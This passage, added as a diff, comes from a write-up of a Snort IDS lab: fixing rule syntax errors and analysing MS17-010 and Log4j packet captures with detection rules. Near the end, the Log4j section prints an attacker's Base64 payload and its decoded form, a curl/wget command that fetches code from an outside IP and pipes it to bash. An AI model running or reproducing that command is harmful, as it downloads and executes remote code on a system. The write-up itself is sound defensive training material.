@@ -479,3 +479,399 @@ Action Stats:
      Passed:            0 (  0.000%)
 ```
 
+**Question 2**
+>Investigate the log/alarm files.
+>
+>What is the name of the torrent application?
+
+We can answer this using `strings` with the log output generated for Question 1:
+
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo strings snort.log.1743331468 
+GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED%F6%03%C49%D6B%14%F1&peer_id=%B8js%7F%E8%0C%AFh%02Y%967%24e%27V%EEM%16%5B&port=41730&uploaded=0&downloaded=0&left=3767869&compact=1&ip=127.0.0.1&event=started HTTP/1.1
+Accept: application/x-[REDACTED]
+Accept-Encoding: gzip
+User-Agent: RAZA 2.1.0.0
+Host: [REDACTED]:2710
+Connection: Keep-Alive
+```
+
+Note - that we can get to the answer also by using the `-X` switch with Snort to look inside teh packet headers:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -r snort.log.1743331468 -X
+```
+
+**Question 3**
+>What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
+
+We can get this from the output to Question 2
+
+**Question 4**
+>What is the hostname of the torrent metafile?
+
+This is also found in the output we got for Question 2.
+
+---
+
+##Task 6 - TROUBLESHOOTING RULE SYNTAX ERRORS
+
+This time when we navigate to the task folder we see that we have 7 different rule files and a single pcap:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ ls
+local-1.rules  local-2.rules  local-3.rules  local-4.rules  local-5.rules  local-6.rules  local-7.rules  mx-1.pcap
+```
+
+The task description tels us that;
+>In this section, you need to fix the syntax errors in the given rule files. 
+>You can test each ruleset with the following command structure;
+>sudo snort -c local-X.rules -r mx-1.pcap -A console
+
+**Question 1**
+>Fix the syntax error in local-1.rules file and make it work smoothly.
+>
+>What is the number of the detected packets?
+
+Let's start by running the command we are given with `local-1.rules`:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-1.rules -r mx-1.pcap -A console
+Running in IDS mode
+
+        --== Initializing Snort ==--
+Initializing Output Plugins!
+Initializing Preprocessors!
+Initializing Plug-ins!
+Parsing Rules file "local-1.rules"
+Tagged Packet Limit: 256
+Log directory = /var/log/snort
+
++++++++++++++++++++++++++++++++++++++++++++++++++++
+Initializing rule chains...
+ERROR: local-1.rules(8) ***Rule--PortVar Parse error: (pos=1,error=not a number)
+>>any(msg:
+>>^
+```
+
+The output tells us that we are looking for a possible syntax error (*"not a number"*) near `any(msg:`
+
+If we open `local-1.rules` we can see there is a missing space between `any` and `(msg:`.  The fixed rule should read as follows:
+```yaml
+alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)
+```
+
+**Question 2**
+>Fix the syntax error in local-2.rules file and make it work smoothly.
+>
+>What is the number of the detected packets?
+
+The debugging output of the console is very helpful here again:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-2.rules -r mx-1.pcap -A console
+Running in IDS mode
+
+        --== Initializing Snort ==--
+Initializing Output Plugins!
+Initializing Preprocessors!
+Initializing Plug-ins!
+Parsing Rules file "local-2.rules"
+Tagged Packet Limit: 256
+Log directory = /var/log/snort
+
++++++++++++++++++++++++++++++++++++++++++++++++++++
+Initializing rule chains...
+ERROR: local-2.rules(8) Port value missing in rule!
+Fatal Error, Quitting..
+```
+
+Opening `local-2.rules` we see that there is no port specified for the source, and we need to add `any` here:
+```yaml
+alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
+```
+
+**Question 3**
+>Fix the syntax error in local-3.rules file and make it work smoothly.
+>
+>What is the number of the detected packets?
+
+This time we get the following error output:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-3.rules -r mx-1.pcap -A console
+Running in IDS mode
+
+        --== Initializing Snort ==--
+Initializing Output Plugins!
+Initializing Preprocessors!
+Initializing Plug-ins!
+Parsing Rules file "local-3.rules"
+Tagged Packet Limit: 256
+Log directory = /var/log/snort
+
++++++++++++++++++++++++++++++++++++++++++++++++++++
+Initializing rule chains...
+ERROR: local-3.rules(9) GID 1 SID 1000001 in rule duplicates previous rule, with different protocol.
+Fatal Error, Quitting..
+```
+
+Opening `local-3.rules` we can quickly see that the two rules have the same `sid` which is causing the error.  We can change the `sid` for the second rule to `sid:1000002`.
+```yaml
+alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
+alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
+```
+
+**Question 4**
+>Fix the syntax error in local-4.rules file and make it work smoothly.
+>
+>What is the number of the detected packets?
+
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-4.rules -r mx-1.pcap -A console
+Running in IDS mode
+
+        --== Initializing Snort ==--
+Initializing Output Plugins!
+Initializing Preprocessors!
+Initializing Plug-ins!
+Parsing Rules file "local-4.rules"
+Tagged Packet Limit: 256
+Log directory = /var/log/snort
+
++++++++++++++++++++++++++++++++++++++++++++++++++++
+Initializing rule chains...
+ERROR: local-4.rules(9) Unmatch quote in rule option 'msg'.
+Fatal Error, Quitting..
+```
+
+The error mentions *"unmatch quote"* so we're probably looking for a missing quotation mark after the `msg` option.  However when we open the rule file we see that there are actually two errors here and none of them is a missing quotation mark!
+
+The first error is the same as in Question 3 - the two rules have the same `sid` value.
+The second problem is that there is a spurious `:` after `"HTTPX Packet Found"` which we need to replace with a semi-colon (`;`).
+```yaml
+alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
+alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
+```
+
+**Question 5**
+>Fix the syntax error in local-5.rules file and make it work smoothly.
+>
+>What is the number of the detected packets?
+
+This time the error output tells us that we are looking for an `Illegal direction specifier: <-`
+
+Snort rules allow us to use one of two direction operators; `<>` or `->`.  However the second rule is using `<-` which is not allowed.  The message in the rule also tells us that it's looking for inbound ICMP packets, so the direction operator needs to be changed to `->`.
+There is also another mistake in the second rule and the `;` following `sid` needs to be changed to a `:`
+Similarly the `:` after 1`"HTTPX Packet Found"` in the third rule needs to be changed to a `;`
+
+```yaml
+alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
+alert icmp any any -> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
+alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)
+```
+
+
+**Question 6**
+>Fix the logical error in local-6.rules file and make it work smoothly to create alerts.
+>
+>What is the number of the detected packets?
+
+This time around we are told that we are looking for a _logical_ error instead of a _syntax_ error.  This means that the rules are crafted in such a way that will allow snort to run without any errors but they will not match on the desired packets.
+
+If we look inside `local-6.rules` we see that the rule is trying to look for HTTP GET requests but is trying to do so using the hex value `67 65 74`.  If we translate this to ASCII (using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NjcgNjUgNzQ)) we get the word `get`.  However the pattern matching in the rule is case-sensitive and we want it to match with `GET` (uppercase), so the hex value should read `|47 45 54|`.
+
+```yaml
+alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|47 45 54|"; sid: 100001; rev:1;)
+```
+
+Or we can simply write `"GET"` to make the rule more readable:
+```yaml
+alert tcp any any <> any 80  (msg: "GET Request Found"; content:"GET"; sid: 100001; rev:1;)
+```
+
+
+**Question 7**
+>Fix the logical error in local-7.rules file and make it work smoothly to create alerts.
+>
+>What is the name of the required option:
+
+Once again we are looking for a _logical_ error here.  This time the rule seems to work fine and even gives us some detections on the first run.  However wehn we look inside `local-7.rules` we can see that the rule is missing a `msg`.  This will still produce matches but the alerts will contain no information.
+The rule is looking for the hex value `2E 68 74 6D 6C` which translates to `.html`.  So we can add a suitably descriptive message to it:
+```yaml
+alert tcp any any <> any 80  (msg:".html file detected"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)
+```
+So the answer to this final question is _**msg**_
+
+---
+## Task 7 - USING EXTERNAL RULES (MS17-010)
+
+The folder for this task contains two rules files and one pcap:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ ls
+local-1.rules  local.rules  ms-17-010.pcap
+```
+
+**Question 1**
+>Use the given pcap file.
+>
+>Use the given rule file (local.rules) to investigate the ms1710 exploitation.
+>
+>What is the number of detected packets?
+
+This should be easy by now - simply run snort with the provided rule file and pcap:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -c local.rules -r ms-17-010.pcap  -l .
+```
+
+**Question 2**
+>Clear the previous log and alarm files.
+>
+>Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
+>
+>What is the number of detected packets?
+
+We need to craft a rule that matches on the string `\IPC$` - however just entering the string as it is would result in an error due to the `\` character.  We need to _escape_ this character by adding another `\`:
+```yaml
+alert tcp any any <> any any (msg:"Keyword match"; content:"\\IPC$"; sid:1000001; rev:1;)
+```
+
+**Question 3**
+>Investigate the log/alarm files.
+>
+>What is the requested path?
+
+Let's have a look inside the matchign headers:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -r snort.log.1743334798 -X
+```
+```console
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+WARNING: No preprocessors configured for policy 0.
+05/18-08:12:07.740322 192.168.116.149:49377 -> 192.168.116.143:445
+TCP TTL:128 TOS:0x0 ID:595 IpLen:20 DgmLen:135 DF
+***AP*** Seq: 0xEF66EC45  Ack: 0x714FEDA9  Win: 0xFF  TcpLen: 20
+0x0000: A4 1F 72 20 54 01 00 25 B3 F5 FA 74 08 00 45 00  ..r T..%...t..E.
+0x0010: 00 87 02 53 40 00 80 06 8D A8 C0 A8 74 95 C0 A8  ...S@.......t...
+0x0020: 74 8F C0 E1 01 BD EF 66 EC 45 71 4F ED A9 50 18  t......f.EqO..P.
+0x0030: 00 FF 34 CE 00 00 00 00 00 5B FF 53 4D 42 75 00  ..4......[.SMBu.
+0x0040: 00 00 00 18 01 20 00 00 00 00 00 00 00 00 00 00  ..... ..........
+0x0050: 00 00 00 00 2F 4B 00 08 C5 5E 04 FF 00 00 00 00  ..../K...^......
+0x0060: 00 01 00 1C 00 00 5C 5C 31 39 32 2E 31 36 38 2E  ......\\[REDACTED]
+0x0070: 31 31 36 2E 31 33 38 5C 49 50 43 24 00 3F 3F 3F  [REDACTED]\IPC$.???
+0x0080: 3F 3F 00 54 48 5F 52 45 50 4C 41 43 45 5F 5F 3F  ??.TH_REPLACE__?
+0x0090: 3F 3F 3F 3F 00                                   ????.
+
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+```
+
+**Question 4**
+>What is the CVSS v2 score of the MS17-010 vulnerability?
+
+This can be answered with a simple Google search: [https://www.tenable.com/plugins/nessus/97737](https://www.tenable.com/plugins/nessus/97737)
+
+
+---
+## Task 7 - USING EXTERNAL RULES (Log4j)
+
+Once again we are given two rules files and a pcap:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ ls
+local-1.rules  local.rules  ms-17-010.pcap
+```
+
+**Question 1**
+>Use the given pcap file.
+>
+>Use the given rule file (local.rules) to investigate the log4j exploitation.
+>
+>What is the number of detected packets?
+
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -c local.rules -r log4j.pcap -l .
+```
+
+**Question 2**
+>Investigate the log/alarm files.
+>
+>How many rules were triggered?.
+
+To answer this question we can have a look inside the `alerts` file which contains a log of each rule that was matched.  We can use `grep` to help filter the contents further:
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat alert | grep -F [**] | sort | uniq
+[**] [1:21003726:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
+[**] [1:21003728:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
+[**] [1:21003730:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
+[**] [1:21003731:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228) [**]
+```
+
+This shows us that there were a total of 4 rules that matched and gives us their descriptions.
+
+**Question 3**
+>Investigate the log/alarm files.
+>
+>What are the first six digits of the triggered rule sids?
+
+By simply running snort again we are given the sids at the very end of the output
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -r log4j.pcap -c local.rules 
+```
+```console
+===============================================================================
++-----------------------[filtered events]--------------------------------------
+| gen-id=1      sig-id=[REDACTED]28   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
+| gen-id=1      sig-id=[REDACTED]31   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
+| gen-id=1      sig-id=[REDACTED]30   type=Limit     tracking=dst count=1   seconds=3600 filtered=2
+```
+
+**Question 4**
+>Clear the previous log and alarm files.
+>
+>Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
+>
+>What is the number of detected packets?
+
+To tackle this question we need to use the `dsize` option in our rule:
+
+```yaml
+alert tcp any any <> any any  (msg: "Packet size between 770 and 855 bytes"; dsize: 770<>855; sid: 100000001; rev:1;)
+```
+
+**Question 5**
+>Investigate the log/alarm files.
+>
+>What is the name of the used encoding algorithm?
+
+We can browse through the packet header using the `-X` switch with snort.  Scrolling through the matched packets we see in the second-to-last packet that Base64 encoding was used.
+```console
+ubuntu@ip-10-10-227-123:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -r snort.log.1743335983 -X
+```
+
+**Question 6**
+>Investigate the log/alarm files.
+>
+>What is the IP ID of the corresponding packet?
+
+Looking at the same packet we found for Question 5 we can see the ID as a 5-diit number in the header:
+
+```console
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+WARNING: No preprocessors configured for policy 0.
+12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80
+TCP TTL:53 TOS:0x0 ID:[REDACTED] IpLen:20 DgmLen:827
+***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
+TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
+```
+
+**Question 7**
+>Decode the encoded command.
+>
+>What is the attacker's command?
+
+Using cyberchef we can decode the Base64 encoded command from `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` to:
+`(curl -s [REDACTED]/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`
+
+**Question 8**
+>What is the CVSS v2 score of the Log4j vulnerability?
+
+
+Typing cvss v2 Log4j into a search engine of choice we find CVE-2021-44228 Detail. A click on CVSS Version 2.0 under Severity reveals the score we're looking for.
+
+
